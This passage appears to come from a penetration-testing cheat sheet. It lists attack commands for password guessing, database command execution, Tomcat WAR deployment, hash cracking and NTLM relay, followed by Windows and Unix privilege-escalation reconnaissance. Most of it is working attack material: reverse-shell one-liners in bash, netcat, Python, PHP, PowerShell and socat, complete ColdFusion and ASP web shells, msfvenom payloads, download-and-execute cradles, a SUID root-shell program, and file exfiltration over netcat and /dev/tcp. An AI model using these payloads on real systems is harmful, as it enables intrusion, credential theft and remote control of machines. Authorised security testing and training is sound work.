	- DNS tunneling is possible if you can perform DNS requests through a Wi-Fi without purchase any data plan
		- Setting up a DNS server as primary DNS server for a dedicated domain
		- Then, the DNS server may be used to route Internet traffic
			- Network flow is encapsulated in DNS queries and responses
			- Packets are fragmented/encoded in DNS queries/responses, then decoded/routed on the Internet by the malicious DNS server
---

### Check service using default password

- **Check online if you can find default credentials** for each services exposed on the network that have an authentication interface

- Several Metasploit plugins can be used, as:
	- `auxiliary/scanner/mongodb/mongodb_login`                                          
	- `auxiliary/scanner/postgres/postgres_login`                                        
	- `auxiliary/scanner/snmp/snmp_login`   

---

### Check service using weak password

If the default password have been changed, it is necessary to test the resistance of the password setted. <br><br>

- First, you can use password database to test the most used password. <br>
    - There is a lot of database compilation of the most used password online. You can use one of your choice, for example `rockyou` or the `seclists`. 
- Then you can build your own password databases depending on the context of your mission (company name, year, place ...). 
    - It happen that the user use guessing pattern according to their working context to create their passwords. For example, you will find the name of company following by the current year and a star. 
    - In the point to generate the list :
        - `john --wordlist=<WORDLIST> --rules:all --stdout > <OUTPUTFILE.TXT>`
            - The file `<WORDLIST>` should contain few words as `CompanynameYear*`, `CompanynameYear!` and `CompanynameYear`
 `john` will generate hundred of word drifting from them, by changing lowercase to uppercase, turning symbolics and numbers ...
    - Once the wordlist ready, you can use `hydra` - `patator`
- [Crackstation](https://crackstation.net/) 
- [Hashkiller](https://hashkiller.co.uk/Cracker/)

---

### Check web interfaces 

**cf. :** *Web application methodology*

If you found anonymous web interface for printer. Try access and modify the configuration of the LDAP server. Put your IP and an arbitrary port. Start a server with `nc` or `ncat`. The printer will come to authenticate to you and you will grab credentials. Most of the printer are linked to the Active Directory, so it could be domain credentials.

---

### Access to a database

If you have access to a database you can dump information (as hashes) from it, you can also try to execute command on the system through the database and the context in which the database is running.

#### SQL server

- The `xp_cmdshell` command can be used in the point to execute command on the system (in the context of the application). 
    - If you have command execution on a system with full privileges you can create a new administrator account on the system.
        - `net user <USERNAME> <PASSWORS> /ADD ; net localgroup administrators <USERNAME> /add`. 

- It is also possible to use `xp_dirtree` to do UNC path injection in the point to grab a Net-NTLM hash on the network. 
    - On the target do `EXEC master.sys.xp_dirtree '\\<TARGET>\\<SHARE>',0,1;`
    - On your machine do `responder -I <INTERFACE> -f --lm -w` or `sudo smbserver.py SHARE .` or `impacket-smbserver`
        - If you want to break the Net-NTLMv1/v2 hash : `john --format=netntlmv2 <HASHES> --wordlist=/<PATH>/<LIST>.txt` 
        - If you want to do a NTLM-relay attack, on your machine do `sudo smbrelayx.py -h <IP_TO_RELAY> -c 'whoami'`

- **mssqlclient.py** : `mssqlclient.py <USERNAME>:<PASSWORD>@<IP> -db <DATABASE> -p <PORT>`
    - `enable xp_cmdshell`
    - `xp_cmdshell <COMMAND>`
        - List a directory : `xp_cmdshell "dir "<PATH>""`
        - Get a reverse shell : `xp_cmdshell "\\<IP>\nc.exe -nv <IP> 9999 -e cmd.exe"`
            - Listen locally `nc -nlvp 9999`

- **sqsh** : `sqsh -S <NAME>`
    - Configure : See below
    - Some  commands : See below
    - Exploit xp_cmdshell :     
        - `exec sp_configure 'show advanced options', 1` then `go`
        - `reconfigure` then `go`
        - `exec sp_configure 'xp_cmdshell', 1` then `go`
        - `reconfigure` then `go`
        - `xp_cmdshell 'dir C:\'` then `go`
        - `xp_cmdshell 'whoami'` then `go`

- If `xp_cmdshell` is disable:
    - First try: `SQL> enable_xp_cmdshell`
    - Second try :
        - `SQL> sp_configure 'show advanced options', '1'`
        - `SQL> RECONFIGURE`
        - `SQL> sp_configure 'xp_cmdshell', '1'`
    - Third try: (https://www.mssqltips.com/sqlservertip/2987/can-i-stop-a-system-admin-from-enabling-sql-server-xpcmdshell/)
        - `SQL> select name from sys.server_triggers;`
        - `SQL> disable trigger ALERT_xp_cmdshell on all server`
        - `SQL> enable_xp_cmdshell`
        - `SQL> xp_cmdshell whoami`

- **metasploit plugins** :
    - `auxiliary/admin/mssql/mssql_enum`
    - `auxiliary/admin/mssql/mssql_sql`
    - `auxiliary/admin/mssql/mssql_exec`

- `sp_execute_external_script` can also be used to execute scripts (https://nielsberglund.com/2017/04/20/sql-server-2017---python-executing-inside-sql-server/)
    - `SQL> EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';`

#### MySQL

- Dump users and password: `select * from mysql.user;`
- Check user privileges: `select * from mysql.user where user = substring_index(user(), '@', 1) ;`
- Get the version of the OS and the architecture: `select @@version_compile_os, @@version_compile_machine;`

- **nmap NSE** : `sudo nmap -p1433 -vvv --script "ms-sql*"`
    - `sudo nmap -Pn -sS -sV -p<PORT> -vvv --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=<PASSWORD> <IP>`

- **User Defined Functions** (UDF)
    - DLLs containing functions called from MySQL. The point here is to download a DLL containing code on the targeted workstation.
    - To know the plugin folder where you have to download your .DLL: `select @@plugin_dir ;`
    - To upload the .DLL file: `select load_file('\\\\<UNC>\\<PATH>\\<FILE>.dll') into dumpfile "<PATH>\\<TO>\\<PLUGINS>";`
    - Example for code execution :            
        ```sql
        mysql> use mysql;
        mysql> create table foo1(line blob);
        mysql> insert into foo1 values(load_file('/tmp/1518-1.so'));
        mysql> select * from foo1 into dumpfile '/usr/lib/1518-1.so';
        mysql> create function do_system returns integer soname '1518-1.so';
        mysql> select * from mysql.func;
        mysql> select do_system('cat /etc/shadow  > /tmp/out1; chown j0hn.j0hn /tmp/out1');
        mysql> \! sh
        sh-3.2$ cat /tmp/out1       
        ``` 
    - Example to get a reverse shell
        - This program set the UID/GID at 0 (root user) then it start a bash in the root context
        ```c
		#include <stdio.h>
		#include <stdlib.h>
		#include <unistd.h>
		int main(int argc, char *argv[])
		{
			setuid(0); setgid(0); system("/bin/bash");
		}    
        ```
        - Compilation of the program and add the S bit to the executable
        ```
        mysql> select do_system('gcc -o /tmp/setuid /tmp/setuid.c');
        mysql> select do_system('chmod u+s /tmp/setuid');   
        ``` 
        - The program should have the following rights `-rwsrwx--x`, start the program in the current user context : `./setuid`


#### PostgreSQL

- To list file on the system you can use `pg_ls_dir('<PATH>')`
- To read a file use `pg_read_dir('<PATH>')`
- You can also use `metasploit` plugins:
    - `auxiliary/admin/postgres/postgres_readfile`
    - `exploit/linux/postgres/postgres_payload`
    - `exploit/windows/postgres/postgres_payload`


#### Oracle

WiP

#### Sybase

- The `xp_cmdshell` command can also be used. 

#### MongoDB

WiP

---

### Dump password from databases

    - Oracle 10g R2: `SELECT username, password FROM dba_users WHERE username=‘<username>’;`
    - Oracle 11g R1: `SELECT name, password, spare4 FROM sys.user$ WHERE name=‘<username>’;`
    - MySQL4.1 / MySQL5+: `SELECT User, Password FROM mysql.user INTO OUTFILE ‘/tmp/hash.txt’ ;`
    - MSSQL(2012/2014): `SELECT SL.name,SL.password_hash FROM sys.sql_logins AS SL;`
    - Postgres: `SELECT username, passwd FROM pg_shadow;`

---

### ApacheTomcat web application


- Trivial password: `tomcat:tomcat` ; `manager:manager` ; `manager:tomcat` ; `tomcat:manager` ; `admin:admin` ; `admin:tomcat`
- With access to the `manager` page of an ApacheTomcat web application, try to deploy a WAR (Web application ARchive) on it.     
    - A WAR is a kind of archive for the web application. 
        - You can generate a WAR application and deploy it in the point to get a web shell on the server or a reverse shell.

- Reverse shell for Windows with Meterpreter : `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war > mrs.war`
- Reverse shell for Linux with Meterpreter : `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war > mrs.war`

- Reverse shell with Java JSP : `msfvenom -p Java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > <FILE>.war`

---

### Using of password hashes

You found password hashes on the network through tools like `responder` or inside a database.

- Break hashes grabbed from /etc/shadow (md5crypt, MD5) :
    - `hashcat -m 500 -a 0 <HASHES> <WORDLIST>`
- Break hashes grabbed from responder : 
    - For Net-NTLMv1 format : 
        - `john --format=netntlm <HASHFILE> --wordlist=<WORDLIST>`
        - `hashcat -m 5500 <HASHFILE> <WORDLIST> -o <OUTPUT>`
    - For Net-NTLMv2 format : 
        - `john --format=netntlmv2 <HASHFILE> --wordlist=<WORDLIST>`
        - `hashcat -m 5600 <HASHFILE> <WORDLIST> -o <OUTPUT>`
- Break hashes grabbed on databases : WiP (Hashcat, JTR)
- Build and use rainbow tables : WiP
- NTLM-relay : Relay the Net-NTLMv1/v2 hash of a workstation to authenticate
    - Prerequisites : SMB signing need to be disabled on the targets
    - Use `sudo ntlmrelayx.py -t 31.2.13.227 -c '<COMMAND>'` to start an SMB and an HTTP server.
    - Edit `/etc/responder/Responder.conf` and set to `Off` the SMB and the HTTP server of `responder`
    - Use `sudo responder -I <INTERFACE> -r -d -w -v` to poison WPAD, NBTNS and LLMNR.

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

# System

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Unprivileged access
### Get a shell

#### Locally 

- Binary with SUID bit setting UID and GROUP to 0
	```C
	#include <stdio.h>
	#include <stdlib.h>
	#include <unistd.h>
	int main(int argc, char *argv[])
	{
		setuid(0);
		setgid(0);
		system("/bin/bash");
	}
	```
	- chmod u+s <FILE>
		- chmod 4755 <FILE>

- Add a SUID bit to /bin/dash
	- You can edit a script running by root
		- `chmod 4755 /bin/dash`
		- `dash`

#### WinRM 

- Install on Kali : `sudo gem install -r winrm`

```ruby
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://<IP>:<PORT>/wsman',
  user: '<DOMAIN>\<USER>',
  password: '<PASSWORD>',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

- Start the script on Kali : `ruby winrm-shell.rb`


#### Deploy a web shell

- PHP
    - WiP
- JSP:
    - Use `usr/share/seclists/Web-Shells/FuzzDB/cmd.jsp`
    - Create a WAR: `jar -cvf cmd.war cmd.jsp`
    - https://github.com/SecurityRiskAdvisors/cmd.jsp 
- ASPX:
    - https://github.com/NetSPI/cmdsql 
- CFM (ColdFusion Markup Language) web shell
    - https://nets.ec/Coldfusion_hacking
```html
<cfapplication scriptProtect="none">
<cfset QuoteMark = "'" />
<cfset DoubleQuoteMark = """" />
<html>
    <head><title>Laudanum Coldfusion Shell</title></head>
    <body>
    <form action="<cfoutput>#cgi.script_name#</cfoutput>" method="POST">
        <cfif IsDefined("form.cmd")>
        Executable: <Input type="text" name="cmd" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"> For Windows use: cmd.exe or the full path to cmd.exe<br>
        Arguments: <Input type="text" name="arguments" value="<cfoutput>#HTMLEditFormat(form.arguments)#</cfoutput>"> For Windows use: /c <i>command</i><br>
        <cfelse>
        Executable: <Input type="text" name="cmd" value="cmd.exe"><br>
        Arguments: <Input type="text" name="arguments" value="/c "><br>
        </cfif>

        <input type="submit">
    </form>
<cfif IsDefined("form.cmd")>
    <cfset argumentsArray = #listToArray(form.arguments, " ")# />

    <pre>
    <cfexecute name="#Replace(preservesinglequotes(form.cmd), QuoteMark, DoubleQuoteMark, 'All')#" arguments="#argumentsArray#" timeout="5" variable="foo"></cfexecute>
    <cfoutput>#Replace(foo, "<", "&lt;", "All")#</cfoutput>
    </pre>
</cfif>
    </body>
</html>
```
- ASP
```C#
    <%@Import Namespace="System.Diagnostics" %>
    <%@Import Namespace="System.IO" %>

    <%
    string cmd = Request.QueryString["cmd"];
    string result = "";
    if (String.IsNullOrEmpty(cmd)) {
        result = "No parameter 'cmd' has been provided";
    } else {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stmrdr = p.StandardOutput;
        result = stmrdr.ReadToEnd();
        stmrdr.Close();
    }
    %>

    <%= "<textarea cols='500' rows='200' readonly>" + result + "</textarea>" %>
```


---

#### Deploy a reverse shell

##### RS to meterpreter

- `msf5 exploit(multi/handler) > sessions -u <ID>`

##### nc

- `nc -e /bin/bash <IP> <PORT>` 
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f`

##### Named pipe

- `mknod /tmp/backpipe p`
- `/bin/sh 0</tmp/backpipe | nc <IP> <PORT> 1>/tmp/backpipe`

##### Bash

- `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`
	- If it doesn't work, do : `bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'`
	
##### Python

- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- `python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('<IP>',<PORT>))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"`

##### Socat

- Launch : `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>`    
- Listen : `socat file:`tty`,raw,echo=0 tcp-listen:<PORT>`

##### ASP

- For Windows: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > <OUTPUT>.asp`

##### PHP

- `php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`
- https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

##### JSP 

WiP

##### Powershell

- `msfvenom --payload cmd/windows/reverse_powershell LHOST=<IP> LPORT=<PORT>`
	- Easy-P: Powershell helper tool, can be used to encode PowerShell script, but you have to encode only the PowerShell source code, without the command `powershell.exe` and its options.
- With Empire
	- To get a listener, from `listeners` menu, `uselistener http` ; `set Name <TARGET>` ; `set Port <PORT>` ; `execute`
	- Generate a oneliner payload linked to the listener from the listeners menu `launcher powershell <TARGET>` ; execute it on your target.
	- Generate a batch file linked to the listener from the main menu `usestager windows/launcher_bat` ; `set Listener http` ; `execute`
		- Use `sudo smbrelayx.py -h <IP> -e ./launcher.bat` to run it during an NTLM-relay attack
- Easy-P can also generate Powershell reverse shell. 
- Nishang
	- Copy `Invoke-PowerShellTcp.ps1` locally : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
	- Add ` Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>` at the bottom of the file
	- Download & execute : `powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')`
		- x64 path : `C:\Windows\SysNative\WindowsPowershell\v1.0\`
			- Sysnative is a virtual folder that will help you access 64-bit tools from 32-bit code
- `echo IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>.ps1') | powershell -noprofile -`

- `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.117.100',9998);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

##### C#

- `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp`

##### WAR

- For Windows : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war > rs.war`
	- `jar tvf archive.war`
- For Linux : `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war > rs.war`
	- `jar tvf archive.war`

##### MOF

- For this to work the **OS must be XP or lower**.
	- These are useful in the event of an **arbitrary read/write on the file system as a SYSTEM User**. 
	- A **MOF file written to %SystemRoot%\System32\wbem\mof\\**, will be **compiled automatically by the OS**, and **allows arbitrary code execution**
	- To check for compilation success/failure, look  within 
		- `%SystemRoot%\System32\wbem\mof\good\`
		- `%SystemRoot%\System32\wbem\mof\bad\`
- [mofpwn.py](https://gist.githubusercontent.com/deltaclock/5d5c87c790ca174ed08a6f208bec09fa/raw/acc67f0cf3170a7b52269e0fe25bcc5bc684c258/mofpwn.py)
- Use mofpwn.py to generate the right MOF file : `python mofpwn.py`
	```
	Enter the name of the mof: initial.MOF
	Enter the name of your exe payload: nc.exe -e cmd <IP> <PORT>
	Upload the files to these locations..
	Windows\System32\nc.exe -e cmd <IP> <PORT>
	Windows\System32\Wbem\mof\initial.MOF
	```
- Upload nc.exe for Windows on System32 (car dans `$PATH`) : `ftp> put nc.exe ../../../../WINDOWS/System32/nc.exe`
- Upload the MOF file on WINDOWS/System32/wbem/mof/ : `ftp> put initial.MOF ../../../../WINDOWS/System32/wbem/mof/initial.MOF`
- The MOF file in intantanly executed and we got a shell : `nc -nlvp <PORT>`

##### Get a TTY

- To get a PTY : `python -c 'import pty; pty.spawn("/bin/bash")'` 
	- Try python3 if python is not found


- Ctrl+z from your shell
- On your device : `stty raw -echo`
- To go back to the shell : `fg`
- Inside the shell : `export TERM=screen`
	- Use `env |grep TERM` to see the value of the TERM variable
    - `stty -a` - `export SHELL=bash` - `export TERM=xterm256-color` - `stty rows <ROWS> columns <COLUMNS>`

---

### RSA keys

#### Access through a bastion using an agent

- `ssh -J <USER-ACCOUNT>@<JUMP-TARGET> <USER-ACCOUNT>@<FINAL-TARGET> -A`

#### Add RSA key on authorized_keys

`ssh-keygen -t rsa -b 4096 -o -a 100`

`echo "\n\nssh-rsa <cle-publique>" >> ~/.ssh/authorized_keys`

`ssh hal@10.10.10.139 -i id_rsa`

#### Break encrypted RSA private key

- `python sshng2john.py id_rsa > id_rsa.encrypted`
- `john --wordlist=<WORDLIST> id_rsa.encrypted`

---

### Bypass limited shell

- /!\ au shell limités : ils bloquent tout ce qui est ailleurs que dans le dossier courant. Il bloque toutes les commandes car il bloque /, /bin ... 
    - rbash : WiP
    - lshell : https://www.aldeid.com/wiki/Lshell
        - Check allowed command : `?` - `help`
            - If `echo` allowed, escape doing : `echo os.system('/bin/bash')`
            - If `vi` or `vim` allowed, escape doing : 
                - `:set shell=/bin/sh`
                - `:shell`

---

### Bypass container

IP address is in the 172.20.0.0 range which suggest that we are in a container
root inside it
check if in docker container : grep -i docker /proc/self/cgroup; find / -name "*dockerenv*" -exec ls -la {} \;

---

### Upload and download

- Static binaries : https://github.com/andrew-d/static-binaries 

#### Create a web server

##### HTTP server on your workstation: 

- `python -m SimpleHTTPServer <PORT>`
- `sudo service apache2 start`
    - Expose the `/var/www/html` folder

##### HTTPS server on your workstation:

- Generate the certificate : `openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes`
- Python script for an HTTPS server on port 4443

```python
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('localhost', 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()	
```

- `python https-server.py`
- Source : https://gist.github.com/dergachev/7028596

##### PHP

- `php -S <IP>:<PORT> -t .`	

##### Raw socket

- `nc -nlvp <PORT>`
	
#### Upload & Download command lines	
	
##### VBS

```vb
echo str_Url = WScript.Arguments.Item(0) > my_dwld_script.vbs
echo str_File = WScript.Arguments.Item(1) >> my_dwld_script.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> my_dwld_script.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> my_dwld_script.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> my_dwld_script.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> my_dwld_script.vbs
echo Dim http, var_ByteArray, str_Data, str_Buffer, lng_Counter, fs, ts >> my_dwld_script.vbs
echo Err.Clear >> my_dwld_script.vbs
echo Set http = Nothing >> my_dwld_script.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> my_dwld_script.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> my_dwld_script.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> my_dwld_script.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> my_dwld_script.vbs
echo http.Open "GET", str_Url, False >> my_dwld_script.vbs
echo http.Send >> my_dwld_script.vbs
echo var_ByteArray = http.ResponseBody >> my_dwld_script.vbs
echo Set http = Nothing >> my_dwld_script.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> my_dwld_script.vbs
echo Set ts = fs.CreateTextFile(str_File, True) >> my_dwld_script.vbs
echo str_Data = "" >> my_dwld_script.vbs
echo str_Buffer = "" >> my_dwld_script.vbs
echo For lng_Counter = 0 to UBound(var_ByteArray) >> my_dwld_script.vbs
echo ts.Write Chr(255 And Ascb(Midb(var_ByteArray,lng_Counter + 1, 1))) >> my_dwld_script.vbs
echo Next >> my_dwld_script.vbs
echo ts.Close >> my_dwld_script.vbs 
```
- `C:\WINDOWS\Temp>cscript my_dwld_script.vbs http://<IP>:<PORT>/<REMOTE-FILE> <LOCAL-FILE>`
	
##### Powershell

- `Powershell.exe -NoP -NonI -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')`
- Add the name of the function you want to call at the end of the file, to call it automatically

##### FTP

- To upload on the target device use `put` do not forget to set the **mode** before download **binary** or **ascii**

##### SSH

- Download : scp <USER>@<TARGET>:<FILE> .
- Upload : scp <FILE> <USER>@<TARGET>:<REMOTE_PATH>

##### Upload **on a Linux target** from your Kali: 

- curl
- wget

##### Upload on a Windows target from your Kali

- `certutil.exe -urlcache -split -f <YOUR_IP\URL>`
- `bitsadmin /transfer a http://<IP>:<PORT>/<FILE> <PATH>\<FILE>`

##### Download a file on your Kali from Windows target

- Use netcat for Windows : `/usr/share/windows-binaries/nc.exe`
- Download it on the Windows target: `certutil.exe -urlcache -split -f <YOURIP\URL\nc.exe>`
- Open a port on your Kali and redirect the data on a file: `nc -nlvp <PORT>  >  <OUTPUT_FILE>`
- Connect to the open port from the Windows target and redirect the targeted file on it: `nc.exe <YOUR_IP> <PORT>  <  <TARGETED_FILE>`
	
##### Download a file on your Kali from Linux target

- On the target : cat <FILE> /dev/tcp/<IP>/<PORT>
- On your Kali : nc -nvlp <PORT> > <FILE>

---

### Unix bash command 

- Loop line by line on a file: `while read line; do <COMMAND> $line ; done < <FILE>`
- Start interactive shell in root context : `sudo bash -i`

---

### Windows batch command

- Se déplacer dans un share :
    - `C:\WINNT\system32>pushd \\<IP>\<SHARE>`
        - `Z:\>dir`
- Copier depuis un share : `copy \\<IP>\<SHARE>\<file> C:\WINNT\Temp\ /Z /Y`
- Utiliser copyx si pas de copy

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

---

### Configuration files

- `gconfig.php` contain the phpmyadmin credentials

---

### System recognition 

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

#### Windows manually

- Operating system full version and basic information : `systeminfo`
	- Check `C:\Windows\SoftwareDistribution\Download` for downloaded updates
	- Check `C:\Windows\WindowsUpdate.log` for installed upadtes
- Current user: `whoami /all`
- Logged users: `qwinsta`
- Local users: `net user`
- Local groups: `net localgroup`
- Is the device belong to a domain: `echo %userdomain%`
- WMIC access policy: `wmic`
- Some WMIC command:
    - Display KB: `wmic qfe`
    - Display startup program: `wmic startup get caption,command`
    - Display shares: `wmic share list`
    - Processes in execution: `wmic process list brief`
- Powershell policy (execution & contenus des scripts): WiP
- Environment variables: `set`
    - `LOGONSERVER`: Domain Controller name
- Windows Subsystem for Linux (WSL): WiP
- Runas policy : `cmdkey /list` will display the stored usernames and credentials
    - `dir /a C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\`
- Services missconfiguration: 
    - `accesschk.exe -uwcqv "Authenticated Users" * /accepteula`
    - `accesschk.exe -ucqv <SERVICE_NAME> /accepteula`
    - `sc qc <SERVICE_NAME>`
<br><br>
- IP and interfaces configuration: `ipconfig /all`
- Route configuration: `route PRINT -4`
- ARP table: `arp -A`
- Shares: `net share`
- Network connections: `netstat -ano`
- Local firewall state `netsh advfirewall show allprofiles state`
<br><br>
- Files and directories enumeration: `accesschk.exe -r -s <USERNAME> <PATH>`
- Windows register
    - AlwaysInstallElevated: 
        - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\`
        - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\`
        - Use the `metasploit` module `exploit/windows/local/always_install_elevated`
        - Use the `PowerSploit` module `Get-RegistryAlwaysInstallElevated`
- Bypass execution policy
    - Try to execute following extensions : `exe`, `bat`, `cmd`, `msi`, `dll`, `ps1`, `vbs`, `vbe`, `hta`, `js`, `cpl`, `scr`, `pif`
    - Signed files (csc.exe to sign a .DLL with a payload inside  : regsvcs.dll)
- Unquoted service path: WiP
- Service BinPath : WiP
- Missing Autoruns: `autorunsc.exe -a | findstr /n /R "File not found"`
- DLL Hijacking: WiP
<br><br>
- Running processes and services: `tasklist /V`
- Running Windows services : `net start` ; `sc query`
- Schduled task: `schtasks /query /fo LIST /v`
- Installed programs (check the version) 
    - Antivirus tool
    - Web server
    - Databases
<br><br>
- Password policy : `net accounts`
- Looking for password
    - Unattend files:
        - `C:\Windows\Panther\Unattend.xml`
        - `C:\Windows\Panther\Unattend\Unattend.xml`
        - Use the `PowerSploit` module `Get-UnattendedInstallFile`
    - In configuration files:
        - UltraVNC: You can find a password in the file `C:\Program Files\UltraVNC\ultravnc.ini` and break it with [vncpwd](https://github.com/jeroennijhof/vncpwd)
        - RealVNC: You can find a password in the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver` and break it with [vncpwd](https://github.com/jeroennijhof/vncpwd)
        - TightVNC You can find a password in the registry key `HKEY_CURRENT_USER\Software\TightVNC\Server` and break it with [vncpwd](https://github.com/jeroennijhof/vncpwd)
        - TigerVNC You can find a password in the registry key `HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4` and break it with [vncpwd](https://github.com/jeroennijhof/vncpwd)
        - WiP (other software)
    - Recursivly in the system: `findstr /SPIN "<PATTERN>" *.txt *.ini *.xml`
    - Through a metasploit session: `use post/windows/gather/credentials/*`

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

#### Windows automatically

- Sherlock: On the target machine `Import-Module Sherlock.ps1` then `Invoke-<FUNCTION> from Sherlock`
- Use the compiled version of [BeRoot](https://github.com/AlessandroZ/BeRoot/releases) for Windows
<br><br>
- Find exploits available on the OS: 
    - Windows Exploit Suggester: `./windows-exploit-suggester.py --update` then `./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo systeminfo.txt`. 
	- Windows Exploit Suggester Next Generation : https://github.com/bitsadmin/wesng
	- On the target machine `windows-privesc-check2.exe --audit -a -o <REPORT_FILE>`
    - Exploits list: [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
	- Metasploit : `local_exploit_suggester`
	
[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

#### Unix manually

Due to the expending Unix world the information gathering process could be different owing to different shell commands.

- https://www.rebootuser.com/?p=1623
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Generic  commands:

- Operating system full version: `uname -a` ; `cat /proc/version` ; `cat /etc/*-release` ; `lsb_release -a`
- Shared object dependencies : `ldd --version`
- Current user: `id`
- Local users: `cat /etc/passwd`
- Local groups: `cat /etc/group` 
- Logged users: `users`, `who -u`,`w`
- Is the device belong to a domain: WiP
- Environment variables : `env` to display one `echo ${<ENV>}`
- Sudoers file : `/etc/sudoers` ; `sudo -u <USERNAME> bash`
- Fichiers SUID : `find / -perm -4000 -type f 2>/dev/null`
    - Use [GTFO bins](https://gtfobins.github.io/gtfobins)     
- Liste les commandes autorisées pour l'utilisateur courant : `sudo -l`
    - Use GTFO bins   
- Display old command : `.bash_history` 
- Display capabilities : 
	- `getcap *`
	- `getcap <FILE>`
	- `getcap -r / 2>/dev/null`
<br><br>

- IP and interfaces configuration: `ifconfig -a`
- Route configuration:  `route`
- ARP table: `arp`
- Shares: WiP
- Network connections: `netstat -laputen`
- Iptables : 
	- `/etc/iptables/rules.v4`
	- `/etc/iptables/rules.v6`
- Look for port knocking
	- Service `knockd`
	- `/etc/knockd.conf`
<br><br>

- Running processes and services: `ps -aux`
	- `ps -eo command`
- Installed programs
- Check crontab : `crontab -l`
- Check Systemd timers
		- `systemctl list-timers
		- `<FILE>.timer`
<br><br>

- Files and directories enumeration
	- Check for non default root directories : `ls -l /`
		- Examples : backups, data, report ...
    - Group access : `find / -group <GROUP_NAME> 2>/dev/null`
    - Keytab files : `find / -iname "*\.keytab" -perm -o+r 2> /dev/null`
        - List keylist in a keytab file : `klist -kt <FILE>.keytab`
- Mounted file system : `cat /proc/mount`
	- It is possible to mount partition with `nosuid` to block suid bit on binaries
<br><br>

- Looking for password
- Configuration file in /etc/*.conf (sshd, httpd, ldapd ...)
    - sshd 
        - Certification authority
            ```
